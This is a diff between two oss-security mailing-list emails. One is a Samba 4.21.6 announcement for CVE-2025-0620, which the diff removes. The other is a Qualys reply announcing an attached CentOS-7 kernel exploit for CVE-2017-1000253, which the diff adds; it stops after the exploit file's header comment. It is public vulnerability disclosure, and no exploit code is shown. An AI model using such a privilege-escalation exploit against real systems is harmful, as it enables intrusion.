@@ -1,4 +1,9 @@
-Received: (qmail 26587 invoked by uid 550); 3 Jun 2025 16:54:56 -0000
+X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["16345" "Tuesday" "3" "October" "2017" "10:08:20" "-0700" "Qualys Security Advisory" "qsa@qualys.com" "<20171003170820.GA27650@localhost.localdomain>" "498" "[oss-security] Re: Qualys Security Advisory - Linux PIE/stack corruption (CVE-2017-1000253)" "^Date:" nil nil "10" "2017100317:08:20" "[oss-security] Re: Qualys Security Advisory - Linux PIE/stack corruption (CVE-2017-1000253)" (number mark "        qsa@qualys.c Oct  3  498/16345 " thread-indent "\"[oss-security] Re: Qualys Security Advisory - Linux PIE/stack corruption (CVE-2017-1000253)\"\n") "<20170926150825.GA17707@localhost.localdomain>" ("<20170926150825.GA17707@localhost.localdomain>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0001
+X-Mozilla-Status2: 00000000
+Received: (qmail 1992 invoked by uid 550); 3 Oct 2017 17:13:52 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -6,306 +11,542 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Reply-To: oss-security@lists.openwall.com
-x-ms-reactions: disallow
-Received: (qmail 26549 invoked from network); 3 Jun 2025 16:54:56 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=oracle.com; h=
-	content-transfer-encoding:content-type:date:from:in-reply-to
-	:message-id:mime-version:references:subject:to; s=
-	corp-2025-04-25; bh=BwabaRIrVmO3GxZ7uLFocD0tkvduKNmZ//MTA+YFgio=; b=
-	mBKX83ugJVxhY7saODtfHep0x3+2ZI5jejyPaWLPMu995WwJqK4VdLhYwNFpt9io
-	OHhRDFG/tcsx1e9vUlyf58LgyafVC9lM5v3qFFYB1x07O1wLWa8HdUCLe3Ajzh5c
-	9karGHzyFS53oDNLr8+V5AcNFnFDQvHJr6wRjO2vmnzIwFNldlEqeCsscX7AICFa
-	7+89Z1+GziHHPSaf53TgMYouYyd7L4UR5W9wa9xOs96l3BbxIoJF+CPMYlsyRCVH
-	GbWIWDac0ZvJw3Jy4zUPUOiPxKuzizBG9tZS+MUW6I3nFc0bQTmULI9TL2fpKOri
-	stVZjRcM3cxCyWgUDOzEpw==
-ARC-Seal: i=1; a=rsa-sha256; s=arcselector10001; d=microsoft.com; cv=none;
- b=Wcpb33QO7wss5ITh6uOgk9phxqQbvOyB0IJiKej7HBtBnwvIWCIt2lTt2ygjZtgU/PWaXwKdD5iih+MtPHUT/yTIzSmoN76RVbzAeYcVOQ9nmjNUlNj/LdzBFIqu/d39obai88i6N/3v22lJ1JRqy8wiYFVCitG8HvyixTKIRiF1ACrEoLQaaQ3Oy66uKUWKvOHZOFY+pVXE7ytnvcUXjOEqy/gee2g1/GgJ1G9FyaWuBJxH3r97EfRJ6KjL7nIfYP60WDvxoAAXetjRI+e6Xe3JTMku+4qPrhpjA6rlVVj5zPbz4iOG+ditExSxnfuptDLk6FbvXfNHMNeFSN1S1A==
-ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=microsoft.com;
- s=arcselector10001;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-AntiSpam-MessageData-ChunkCount:X-MS-Exchange-AntiSpam-MessageData-0:X-MS-Exchange-AntiSpam-MessageData-1;
- bh=BwabaRIrVmO3GxZ7uLFocD0tkvduKNmZ//MTA+YFgio=;
- b=g/Zah3bj2LMpDlBpVCfsxudrUwggp+1n1iL7JKWXBO063OWbTmDW5DS5+lr8YX50iEb2znJq5JSjqDWgsk6X0CE9b/v+zOZzkYoRF/sBVAb20aA0F+xFALVejc+pgRO+MixDxcDOs4hwkKnI7n6zWTi7jGYkNlKDdjXUdUzC5A80bMFx8qMZk6eT+DE7RgdFzoW3WdRZhdPM1S+x/PzRg7CcgtzRVQS8ACtQ5cB4pHONL/FzR7GNtlKYcVzwMGiOzXzwTLkEuX4O7/xW6qPIpZK/wAMzOodwLMSBz/x/5wFr5tx2a9LSD0rYhiihGB7C1n6xR/3+gUBGQ+KY1bJEHQ==
-ARC-Authentication-Results: i=1; mx.microsoft.com 1; spf=pass
- smtp.mailfrom=oracle.com; dmarc=pass action=none header.from=oracle.com;
- dkim=pass header.d=oracle.com; arc=none
+Received: (qmail 32003 invoked from network); 3 Oct 2017 17:10:36 -0000
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
- d=oracle.onmicrosoft.com; s=selector2-oracle-onmicrosoft-com;
- h=From:Date:Subject:Message-ID:Content-Type:MIME-Version:X-MS-Exchange-SenderADCheck;
- bh=BwabaRIrVmO3GxZ7uLFocD0tkvduKNmZ//MTA+YFgio=;
- b=eT9skLg1htb5BbfudkgUOTF3anUcy/eOcPd1Vidrlo1r3/qccwysyQ6vTOf5O6PAJEiZ8rvArpTjRIUXDQpqE5+J43IXK6pN4NFJM3lqfLjLVQ09I05PY/qFvn7OtoLSupJy+LzgK4AgKN3wsSGBWWhZtgjoL1QCh75jPNTowS4=
-Message-ID: <89332613-efb8-45ad-b68c-f5bc0ff3d093@oracle.com>
-Date: Tue, 3 Jun 2025 09:54:38 -0700
-User-Agent: Mozilla Thunderbird
-Content-Language: en-US
-References: <4ab34772-0c26-4b03-9cec-a375e36fc9ff@samba.org>
-From: Alan Coopersmith <alan.coopersmith@oracle.com>
-To: oss-security@lists.openwall.com
-Autocrypt: addr=alan.coopersmith@oracle.com; keydata=
- xsDiBEab+moRBACDH5yKqS3wcc5bdxY7PBNuwKvF5TKMfagmSvuRDtZjjIIWaA/nZ1KboV9G
- q5g7kP7+Kfu+Qgd8u65eVsWwmPW10fXvj3aCU53glx2EdGdrHcgiyH2gEQfPiyBw+trIppWF
- RV0IDXSLMA1FNC92t2nSG/VFHaPTVwcgkIRSfcXDvwCglGdEa6f4uLqoNHP+m4yYnzapFuMD
- /R4+2AJDAvEWKDdYCGZzlawjAmmWyXrmT7/C/mx98qUR473l4buXjHgDkkXXlHqdzil1vK85
- PhrKzNJDCCmlHUJNz+QwiAMOLwpD+kwVPb57RG7y+a5JQ5+jtVw4RlUxZIk/wj2An9YBO3A5
- vR7PdjM32ZJCN2+aM4dYfNzQxQKTA/47icvBaBVTl9rztjg2pd2Aqpc1P/GsIYLGj7XjnnJv
- GAENBHSH1QjpZMJGCTS9oJ+B0/wrIr+pA+MdFgYAb6ojMQJOO6UChjWWSGjMFcs/CeXhxlLB
- ido3DtAETbNTwO6OEfAvdosvTdhJFnwvZlJ+zZGGy5CrF2Fd9PUe9tmASc0uQWxhbiBDb29w
- ZXJzbWl0aCA8YWxhbi5jb29wZXJzbWl0aEBvcmFjbGUuY29tPsKCBBMRCgBCAhsDBgsJCAcD
- AgYVCAIJCgsEFgIDAQIeAQIXgAIZARYhBEoZPAbTXnxnD6TvC6L7nggfLRMOBQJkQs2eBQkn
- DNS0AAoJEKL7nggfLRMO1esAnR4FVD60BpDY/bJp5RC1VXhOVlo4AKCJgsQeVeGLxDlMuhAm
- bcCkOjafqc7BTQRGm/pvEAgAmnlpSWGjmtSGlLqKTuymwBAU9G7Jw8ow27QngXS/86g/PTzm
- yhXzK0uPgeoIaTZlqaHWNKCWJnC6T2btXtaDHH6cElrClYNf94os5sSt8PBDh184W+NtctAy
- Y2dA1pQYhYs8/eXwa4E4cyrrQG75M+CHrbu9Se0vlERARCpNcjNYLpTXRCwNuUvAi905VJ0Y
- XnGX83WbJfNIq+uxnBa2gVzwb2/2FwKOG03Wyb1vs6NznWJle9x61y8/LlEDoBRbfIQTFp51
- R0ue8gX2yMVgh8lYVViHYCBq+cat7p8X41Xa/fN/HfBFPsf3/+bhggNgmaBmDJBxxd6BPB8Y
- EireiwADBgf/UWIxQwwRLkiXPacOoh34MJYQIBTrCC8gVFxetlbEPEH5mueZMJegAPTF52l8
- 6REenxdNVz/0xT7BD6VlHHY5DowlbRca4W8eb3gpkX/wfNYDYCHtTifT7ewumTrNZx5mrbNk
- 0XTJVOPAP3z7E0rVD2w/xo4p22DzIwfeGKwpHqt1b6Z9fmrRDwaiXaFmwUf+rIiGc/OFcOSe
- 46HwTmIyTOt6NVdQSf75jOPbdeM/n1I5svOdWTLEj6QEj2q9UQ98UEPJuMdaotyBFwKlcDOO
- LMSL793fWINrYSskdXhHjaht5wWqI+egO2JfciI/vP1+bEzhpY9llGq+r7WG3nCSf8JJBBgR
- AgAJBQJGm/pvAhsMAAoJEKL7nggfLRMOgugAoIdhGnD9d/IS6fDVgv+4xnOXvyohAJ0VVxc1
- uoPzepWFbgvLuHIMvyjRog==
-In-Reply-To: <4ab34772-0c26-4b03-9cec-a375e36fc9ff@samba.org>
-X-Forwarded-Message-Id: <4ab34772-0c26-4b03-9cec-a375e36fc9ff@samba.org>
-Content-Type: text/plain; charset=UTF-8; format=flowed
-Content-Transfer-Encoding: 8bit
-X-ClientProxiedBy: SJ0PR03CA0167.namprd03.prod.outlook.com
- (2603:10b6:a03:338::22) To DS7PR10MB5005.namprd10.prod.outlook.com
- (2603:10b6:5:3ac::15)
+        d=qualys.com; s=google;
+        h=date:from:to:subject:message-id:references:mime-version
+         :content-disposition:in-reply-to;
+        bh=in84p4Yft8Dcnd60evMvReq/d7LbM0VuZ+66hwQi5fs=;
+        b=pUlRptMSBiMP9eUCDA2hwXNljnRSiWM9L9PS7DTxqATIseHJHy0aW6+PMlqWV6Qgnw
+         TlIj8+Nkur9zfOSZfE+lEh8rrhlAIbC/MhDvdqoWQkYjk70IvpH3r8LDCzRv9ClMpZLn
+         XLtcSn5Ud7eXzeked5+ih+3NLINTpQi6x/QXuGmZIvvtcVm9qNAip40m/QwTUBoGHH/H
+         pcC/up+ROBTa9MilgTtqWG15GhcURVPru6Wf4IXY3476Ul6fdugO7Uzo7jZh99Uv8pZ/
+         qVZYItpeF9Br8SadLRHp6T+YW7ODHUKBKMpMk9h7FOYhGLN3dOBQkDk2nadtaVHx70qL
+         OUoA==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:date:from:to:subject:message-id:references
+         :mime-version:content-disposition:in-reply-to;
+        bh=in84p4Yft8Dcnd60evMvReq/d7LbM0VuZ+66hwQi5fs=;
+        b=S5zWGvFww1JaCGfKOWZThabGl3XuubmKY1kjRdDyP3F/ReCnVwJkYme5a+I0WhbGGA
+         4rnhHluEDBHzGbavXDR3nyfpvPrO1PjFTX7VOFZca8kHkfne3wLLl4mLIRiFylBqH27Y
+         G9HPcJNOawuPrUYFm6P8rjKyJ4tBm2bezi26c5hYenbqsZrQswSZ3lYILmTgG3jKosPR
+         ue+3tPBVK59Cr05DT8WrVj1tVffCr3XapmJOFz40VupA+sNErWDbtvL8WLqY9/Xi/JJ1
+         mIYOE1NAnzrEFnQW1YGK3wzQQlkpDCj+BJYWwovRHaunlChTMnBgCCUadp5DsJa4bBnz
+         aDAw==
+X-Gm-Message-State: AHPjjUg3Tt4FmIkcrlsRI7wrSNqDOvShfjo6W98ST/CQCqmloZ6LvpOZ
+	cNYUpzsjrx1IxlNGQZK/f0X9plyn
+X-Google-Smtp-Source: AOwi7QBJ4w8q03asFWCfGKyN5iAxU8FgX2osPM4HruqVs54egDH8u7tAjbGJWIlI6xXHGZcuEVtKtw==
+X-Received: by 10.84.248.13 with SMTP id p13mr17689936pll.447.1507050624527;
+        Tue, 03 Oct 2017 10:10:24 -0700 (PDT)
+Message-ID: <20171003170820.GA27650@localhost.localdomain>
+References: <20170926150825.GA17707@localhost.localdomain>
 MIME-Version: 1.0
-X-MS-PublicTrafficType: Email
-X-MS-TrafficTypeDiagnostic: DS7PR10MB5005:EE_|SJ0PR10MB4432:EE_
-X-MS-Office365-Filtering-Correlation-Id: 25ce397d-e988-4416-541d-08dda2bf54f5
-X-MS-Exchange-SenderADCheck: 1
-X-MS-Exchange-AntiSpam-Relay: 0
-X-Microsoft-Antispam: BCL:0;ARA:13230040|1800799024|376014|366016|13003099007;
-X-Microsoft-Antispam-Message-Info:
-	=?utf-8?B?Y3EvdEtxSlk5VndTQWc0YUp6OTRYQWg3NmFPZ0Qvb0FjdlZFcFIxRlZ3OTZY?=
- =?utf-8?B?WUxBUTBNQnp1eTlQQ0ZVaW9OSUhZN0g2dVFJb01lWk1SZVFvUVQzb1lNS2c3?=
- =?utf-8?B?WnkyVkw4TmYzdjk4emIxYVVsUkM3Zy9OVnpuVEQxakg5MWIwRWlPdlY1NEdp?=
- =?utf-8?B?eE5VYTMxZ1l1MUFrQTVOMTV1a3Z2SjQxVVRkamFSMFhFYWVnUGtmVmdOcUZ0?=
- =?utf-8?B?LzNnTjVTdmlnazZVL3Y2WTcwZmtURXNxU0EyN1VZWVE2S29GcitkSVhsVksz?=
- =?utf-8?B?bkZ4cjJTVnBMMHlVKzNWdFlWWkFUUmtSMGRLNHhiNUhSOXR2OEdkOGR6NHhK?=
- =?utf-8?B?cnpaU0tBLzhFVkl4L2F2R3E4L01BRC9waUtpUm9NQ1RmU0ltczNTMlNlMDdR?=
- =?utf-8?B?dllPSEk3ZkdEVVZEdkdEdk96TGVNUWZCVGZiRGdCQ3pqckl5Zk4zWDRVa3JP?=
- =?utf-8?B?VVdvbnNmWUlmd0VLSkYyM2VoWk9hT2V1cjhRdEZkVG9jTXhHb285SmJPcktQ?=
- =?utf-8?B?VUllWVdtSjFpemdXcFprM0xDbDk2bnc3VWVEOExOc0ZrOHgzUk8xajNFd1RG?=
- =?utf-8?B?UGRqSzB6Ukc5bzNlQVpxRXM2TTdCVE90U2JCQ1dvTUVPaEZtTkNDVlo5YVgr?=
- =?utf-8?B?NE5rcjMyNDV0YlpQWExuUnNWcTJJamQya0FxNjZ3K0V2bmVDcUoyWXFIOTh6?=
- =?utf-8?B?M2phayszNFQrTENaaXppV0dnak1Sc3M1ZHNwM1RzQmVyQTRFc1h3TGJjQVpL?=
- =?utf-8?B?QzdBaXZ3dURpZkJMQkhDbjlnak1oVmlkcXVEUmxlaXBjeFdsZjhJWUIxNzN6?=
- =?utf-8?B?OGhpb1lzd3RIL1lVQk9qMjRYRnYyaCtraHFaZENBcmJGWSs4NFVxL3YxWlVU?=
- =?utf-8?B?U1d5WWtJRkM5aVoxQXlsUG9PVUlkdHZ5bFYzTnpKSzU4QW95WjhQL2tDM01M?=
- =?utf-8?B?ZGZ1dllNeGZxRWdDNS95RU1IZDRGODdGWlpZc01hSHlvU0plSy9BU0RIem1R?=
- =?utf-8?B?S014a25qSkNEOStHTUl4SDY1dG00V29FUkIwZTdjdmUwMXg5ZW5hWEhjTFJL?=
- =?utf-8?B?a0JWSjlVVVZOVHNsQXhvMXkwTEc5QlpFR1FRM2R0eUN2QUtRcnpaRDJIZHVV?=
- =?utf-8?B?NnZGUkdoQy9ybkpqb0cwczdnUEd4ODlieXV5b25Nc041bGNoaUpPVVRRdFhZ?=
- =?utf-8?B?bU9SY0FHZG5qc3BiNEFMYUFTMGcwSEs3ZUEya2NCbTF6NlA2NUdOMzNNNExx?=
- =?utf-8?B?WWMwRWVWVktUQk8xQVk4NlBJTFJmWnA1aHFPRE9xdXByOHAvb1hhZi9RZkh2?=
- =?utf-8?B?VkJKLytJc012YXVJZXdwMk1rbW9sajR4VDBmampiVE1jVFNrTCtHMEs5UXNt?=
- =?utf-8?B?dTVNOFo3R2F2MVE2R0o5V01JUlg3bVN0YTc2cW5iZUlUTE5xSytVWGlJSGxR?=
- =?utf-8?B?MXpSNEhQelBWc3ZTL0xsTnlmWnAxQTVRU1ZWUWUveS9LNnRtUm9raTg4OTNk?=
- =?utf-8?B?NktkNC9JT210MzdoM0JwdWNmQ0ZuU3c3MmJDUUJuTkJxYjZWMi9ZaEE2ekJM?=
- =?utf-8?B?cFNScW1DQ2xMdGtHVHltcS8wZU5sand3NjlyTElBbC9BOWI0WExzSHRRYXZH?=
- =?utf-8?B?eTBHMjNqMVNHc09WOTd1TE41cEpNK2czSjlhWW5XQjNEcFNyRXkxYkdOQm1h?=
- =?utf-8?B?QkM5TU5nZmFabkxXV2tIUDNLMUpReW92RHJER01SK2wxT1g0ejdmZno0TUFu?=
- =?utf-8?B?ZXlBMHF0SzFIR3I3YmM1ZEMwYjhqZ2lheTVzcGhFRlFrMHZ3dUNYdjk4YzFl?=
- =?utf-8?Q?cZ28OmwY4GL+2pnp9srfMoBV29s+kz2R3oG00=3D?=
-X-Forefront-Antispam-Report:
-	CIP:255.255.255.255;CTRY:;LANG:en;SCL:1;SRV:;IPV:NLI;SFV:NSPM;H:DS7PR10MB5005.namprd10.prod.outlook.com;PTR:;CAT:NONE;SFS:(13230040)(1800799024)(376014)(366016)(13003099007);DIR:OUT;SFP:1101;
-X-MS-Exchange-AntiSpam-MessageData-ChunkCount: 1
-X-MS-Exchange-AntiSpam-MessageData-0:
-	=?utf-8?B?NkRFQ3Y4MGVtMmxzR0hlK3lpdkVPR1FjbVpKazUwdWtqMmhTMkhoQUZHVEZH?=
- =?utf-8?B?ZmRraG1BaU5BTlgxaGl3QS9oMDFlYmFsZm5mRkZzQnlVenhjNXp3RzFTdnJl?=
- =?utf-8?B?YndUVTlWK2dtV3dWZlh4TmNVdjNkUE9FOTJaYVcvUEkvNGVNaUFPNWJ4amdP?=
- =?utf-8?B?SFlBZG5RUCs3ajJpeE5GR212Mm5WcEhKRFh5VWNmUkUzNGIwZFZIU1pHQ0pn?=
- =?utf-8?B?UjNLOUllVlVxSzVkbnNwVVR3OCtXUFBaOEZDOG92Y2FCbDlmd0RmWFZqeHlo?=
- =?utf-8?B?K2Q0dng4QkRHWmxEMlNzQzRRNmZUU2pmQjhScVI0aDljZ0NWWDdlMG1tc2N4?=
- =?utf-8?B?c1ROeTNCUkRCLzhNN1FJZDVsaE9RcXhGWmsyTEFkL0szMlhmdFJKQWFZanA0?=
- =?utf-8?B?b05CaDRxRlFpSUlBQkE3c1hYdWpXZTd6TzZvSEwyU1ZHU1dzNC9DM2h2NkJn?=
- =?utf-8?B?S09wUHM2VTZMUFBMT2dZSTE0b3VDT3d5OTJZdm5rSW9YT1MzREpPM0V1RWxz?=
- =?utf-8?B?ditzVENkWFJYUDEzdFNkNkV5TnNvWVZMbWZtVmNlQmQ5Z0JGOWdMOURmckNo?=
- =?utf-8?B?WlJxY3ZZT09WM0ZiSWVmaHFtVjlrdzNNL014TXA0NmJRRkR2cmlhcW0waHVq?=
- =?utf-8?B?cGdxaFhzZ3p0OVd6SEl5MjN3cXhzajJ0bjFBbHVNQWY4MWpMRVRMRGl1MjNT?=
- =?utf-8?B?OU84Zk9VZjA4bEpoc1VMNmZ2ZE9FZnQ5VmsyRUh0YTdQbVNrTEMrNGs3ZGk4?=
- =?utf-8?B?ckZBQVp2WWF2L0tYbjgrU3ZsUnpNY1dFUnJqbGcrU2hmUXBPR0x1aVE1V2h1?=
- =?utf-8?B?cCtNWi9ReUJpSzRkSERaZU84TnBsZFZKYkNUM1pTNURjcis0NUVKdHAzOGJ4?=
- =?utf-8?B?MjhhZjdTaG5Pb29KWms1YXZPazY0NGJKTDhwK1lnQXVDVDlBYlpVUm9kN1Ri?=
- =?utf-8?B?dGtRcGhBZ0hndURTZXgwSlBEUTcxZmdXaXdxWHN2Q0xxb25kemhaMXFCN0d4?=
- =?utf-8?B?dmhHQWRwMHR3QlBsVGM4c0lhb0N2b21qMDFud3F1bXhGeXU5VEdNZXF2ZWJ4?=
- =?utf-8?B?cE1Ic2ZOeElVektPMkFBd1JIVHlyZWdrcTY5R2s4d055dTY3Tks2TGNOeVdw?=
- =?utf-8?B?Q2tXT2RCOUtBeGFjUVJFaU03RE9haVEybGc3dXdkbys1eE9IT2pWZUVtM2k0?=
- =?utf-8?B?SWNZUWxsK0g1RFRmYU9TaDlHeVZkb3BlTUpvZE5qMXV6MWpDVHVKbHhiU2ZW?=
- =?utf-8?B?T1FuaTFRQUR6bE05WUhkbGFwK3E1Tzl4WkdaU1BPSHQ0RFpRZTg5aklwdldj?=
- =?utf-8?B?Q24yRXJDNExXTk85eDBBZ2tWemllRStpOEFsalVOaXUveDVhMFNsalB4d241?=
- =?utf-8?B?cnpJUnN5YkFCUkFuWkExMWh6MURVTnNTcXJma29ZNzRmb1hmOGNmRWRqeVZw?=
- =?utf-8?B?MEs1by9BaS96YWZnZTJsenFTQUh2SUhxUTQyb2l2djVVdVUyNExvS1JjK2hl?=
- =?utf-8?B?NzZBYkhBbzJoV1FQUW50L1k4QlVXQlFqcnVXMjJDQkJuWGwrcmlCUjQraGxz?=
- =?utf-8?B?UUgyVGliVHVYWU5RSjd2WW5PMnZCUy9kSS93dEVMMkFMOHEyQzcvQisxV0JP?=
- =?utf-8?B?Rk10SitnZmw3MlBIb2NKUTR1MnFzWmhwenYwM3dWeUxzaWVKV25WaWpWTjlL?=
- =?utf-8?B?OGQzcUdlYzc1d25sdzFXb1U5eTVkYUgvNzJxTHV3U2lNbTZwNFRQVWR1U3ZS?=
- =?utf-8?B?a3Rpd0ltV1ZpeGl6SURCRFZaaTk0amZpaURYMVJqMlVkNVYrNWhXY2xiM3A4?=
- =?utf-8?B?dmpDSThNZHlVYXd6SVNsdGpKNkQvNnhwQjl2cFRXUFZWK1ovdkhEbmlhSmli?=
- =?utf-8?B?ZllvSG5pUHppakJZdm9ER1kxN09IOHBGR1gxWHdvZm9qT3J0U0FKR2xUQVhE?=
- =?utf-8?B?U1M3QkJkU3hnK2MvZDVFb040Q3p6ejc2eXhyc2gxM1lSQS9oYSsrbWVJSkZ1?=
- =?utf-8?B?REFXSFNrUXVhOXY3T3FQRXB2TzRyeVQ1ejJZdkkzclMveXJlRlA3YXNDVUpv?=
- =?utf-8?B?bit5UkJvQVpZWjl1WHUyUHBhN0xubjRlamxRWTJRakUrQVdnTmg5aFpTcjZ3?=
- =?utf-8?B?ejIvMjJLZ2RhU2o1enppQXR6blJsaGcxazBHUEpiUzBNVHlRd0JFQWJ0TXMx?=
- =?utf-8?B?VkE9PQ==?=
-X-MS-Exchange-AntiSpam-ExternalHop-MessageData-ChunkCount: 1
-X-MS-Exchange-AntiSpam-ExternalHop-MessageData-0:
-	dESbC11zORYF2Qb++lT3DNkn2d7CJFxkRGz58EOd/T4aE5ahONZFUFpKBMnG+2SaEi6iB4hQy3OWsupXErjrvAqGghbxb+116pUx7G8nxfPnSS68vgc3WIEK6nRJznLB968Td3+Zi6wpRLUs+rfsE7CZyyt6WuWaITL4VElbLvcdLqVS+aN9gVefrwspNKDjcYnMbxMepW3ayoWkRlU8C0fRKNK9p01Q+E9s3DIogRHBWGG3J9WxesM0qn3d0EQbsKrG/tNlLVDee0Toj1Vjx83kdEbU4nYmUeob6v9NF4asa3NZOZo0X/XtayU+ELC7tY//jnPyM4kGQ6KlFvDUlhMfXt+r4iMefIJw4X+75Ii2esHDwBV1lSu1M9FKD0b33JrDiqzvkQ7C5TEFYAil7V12XygI9eWjcVq8n4/l0NEe6u3YgLj88gIYTIrrwH4vWTc23g+tu0RmOX4ZHnGTQSjvhExSoP+cBtFoIW7QeziVkj/qoPdVp8zco6L8L81OYTeWvQaEfYrHBIWPfSTF6Wxgc0YrpT7i84BNR14LCy/MkQnmp7bu4C43zWiKeOEMOw3kHyMCmN691NzCLoIDwaE4+q2C+eujd7hq3HH8uqc=
-X-OriginatorOrg: oracle.com
-X-MS-Exchange-CrossTenant-Network-Message-Id: 25ce397d-e988-4416-541d-08dda2bf54f5
-X-MS-Exchange-CrossTenant-AuthSource: DS7PR10MB5005.namprd10.prod.outlook.com
-X-MS-Exchange-CrossTenant-AuthAs: Internal
-X-MS-Exchange-CrossTenant-OriginalArrivalTime: 03 Jun 2025 16:54:40.6498
- (UTC)
-X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
-X-MS-Exchange-CrossTenant-Id: 4e2c6054-71cb-48f1-bd6c-3a9705aca71b
-X-MS-Exchange-CrossTenant-MailboxType: HOSTED
-X-MS-Exchange-CrossTenant-UserPrincipalName: PeJJZR5UkWxTfAe9PYl/cC/rf07la0WpXY4hW+YhUtz0WL0syAp2BJhJBWxiouzEijcnJDATUTxssKbpGV2RATK42WkZpwU2F9HeDDRR7u8=
-X-MS-Exchange-Transport-CrossTenantHeadersStamped: SJ0PR10MB4432
-X-Proofpoint-Virus-Version: vendor=baseguard
- engine=ICAP:2.0.293,Aquarius:18.0.1099,Hydra:6.0.736,FMLib:17.12.80.40
- definitions=2025-06-03_02,2025-06-02_01,2025-03-28_01
-X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 phishscore=0 mlxlogscore=999
- bulkscore=0 spamscore=0 suspectscore=0 malwarescore=0 mlxscore=0
- adultscore=0 classifier=spam adjust=0 reason=mlx scancount=1
- engine=8.12.0-2505160000 definitions=main-2506030147
-X-Proofpoint-Spam-Details-Enc: AW1haW4tMjUwNjAzMDE0NyBTYWx0ZWRfX3n3jC1SyQnKx f9Y1hlM/k7nsDxwv8lp/tGgThWcoW0MVB1SwJbakciJw0rsNhd1CWCltnmD1KBVLqrJKgynuhTV Cpmxp0GtPSf6ywLhCfXHqkJa8j78HXXMhWpEmXkpxp7Gr+L2OH6ceTihNZWjfbebwO+84bsameg
- t5+mTIZD67r6M2YzweeSYoZ+fVi7kTIgpYtY8eqBf/Razv/eLWkp7TserUUD1/wGwpGWFKxM/jj 4TMBeMf74G1CWCwzHYV7soizMReWOhZ0R1/GOzfLo/z3qEjXupd8AbxEmhbNrIvCBM3ALlGHEMR eFzdDY1N+lmQ2/XEdGQ7nUyP2FsZfX2rPyyeZk1tqoUtH2FQZjjcpWIE9iYfwPGeAnLW7zcytq3
- ik8PkaGzXg09qkyTPE/W8KRqMp2Xcbi3FFpDNlAI27i4CxQGzjZIWY988k+deNIM37QgYGXI
-X-Proofpoint-GUID: TzHEj0WdGfm2qSX8e_EfqlwgoecO3LaH
-X-Proofpoint-ORIG-GUID: TzHEj0WdGfm2qSX8e_EfqlwgoecO3LaH
-X-Authority-Analysis: v=2.4 cv=H5Tbw/Yi c=1 sm=1 tr=0 ts=683f28d6 b=1 cx=c_pps a=WeWmnZmh0fydH62SvGsd2A==:117 a=WeWmnZmh0fydH62SvGsd2A==:17 a=6eWqkTHjU83fiwn7nKZWdM+Sl24=:19 a=lCpzRmAYbLLaTzLvsPZ7Mbvzbb8=:19 a=wKuvFiaSGQ0qltdbU6+NXLB8nM8=:19
- a=Ol13hO9ccFRV9qXi2t6ftBPywas=:19 a=xqWC_Br6kY4A:10 a=IkcTkHD0fZMA:10 a=6IFa9wvqVegA:10 a=GoEa3M9JfhUA:10 a=hGzw-44bAAAA:8 a=sAV9wGZvAAAA:8 a=DfNHnWVPAAAA:8 a=lB0dNpNiAAAA:8 a=I2lh5nmXAAAA:8 a=inRunXuVZDo-5TTtKWsA:9 a=3ZKOabzyN94A:10 a=QEXdDO2ut3YA:10
- a=IwHZtBPkvs0A:10 a=Sp3aJtJcjDgA:10 a=2_K8r0WgY2IA:10 a=rmA-FMTVYrEA:10 a=HvKuF1_PTVFglORKqfwH:22 a=lVQL-uvWM5arJzzprxL4:22 a=rjTVMONInIDnV1a_A2c_:22 a=c-ZiYqmG3AbHTdtsH08C:22 a=JlL9aOIgGzp64LwJF9-u:22
-Subject: [oss-security] Samba 4.21.6 fixes CVE-2025-0620 in SMB session
- re-authentication
+Content-Type: multipart/mixed; boundary="gBBFr7Ir9EOA20Yy"
+Content-Disposition: inline
+In-Reply-To: <20170926150825.GA17707@localhost.localdomain>
+Date: Tue, 3 Oct 2017 10:08:20 -0700
+From: Qualys Security Advisory <qsa@qualys.com>
+Reply-To: oss-security@lists.openwall.com
+Subject: [oss-security] Re: Qualys Security Advisory - Linux PIE/stack corruption
+ (CVE-2017-1000253)
+To: oss-security@lists.openwall.com
 
+--gBBFr7Ir9EOA20Yy
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
 
+Hi all,
 
+On Tue, Sep 26, 2017 at 08:08:25AM -0700, Qualys Security Advisory wrote:
+> As a proof-of-concept, we will publish CVE-2017-1000253.c
 
--------- Forwarded Message --------
-Subject: [Announce] Samba 4.21.6 Available for Download
-Date: Tue, 3 Jun 2025 09:11:55 +0200
-From: Jule Anger via samba-announce <samba-announce@lists.samba.org>
-Reply-To: Jule Anger <janger@samba.org>
-To: samba-announce@lists.samba.org, samba@lists.samba.org, 
-samba-technical@lists.samba.org
+Since CentOS 7 patched this vulnerability on September 13, 2017 (release
+1708), we attached our CVE-2017-1000253.c exploit for CentOS-7 kernel
+versions "3.10.0-514.21.2.el7.x86_64" and "3.10.0-514.26.1.el7.x86_64"
+to this email (alternatively, this exploit is also available at
+https://www.qualys.com/research/security-advisories/).
 
-Release Announcements
----------------------
+Thank you very much!  With best regards,
 
-This is the latest stable release of the Samba 4.21 release series.
-It contains the security-relevant bugfix CVE-2025-0620:
+-- 
+the Qualys Security Advisory team
 
-     smbd doesn't pick up group membership changes
-     when re-authenticating an expired SMB session
-     https://www.samba.org/samba/security/CVE-2025-0620.html
+--gBBFr7Ir9EOA20Yy
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: attachment; filename="CVE-2017-1000253.c"
 
+/*
+ * CVE-2017-1000253.c - an exploit for CentOS-7 kernel versions
+ * 3.10.0-514.21.2.el7.x86_64 and 3.10.0-514.26.1.el7.x86_64
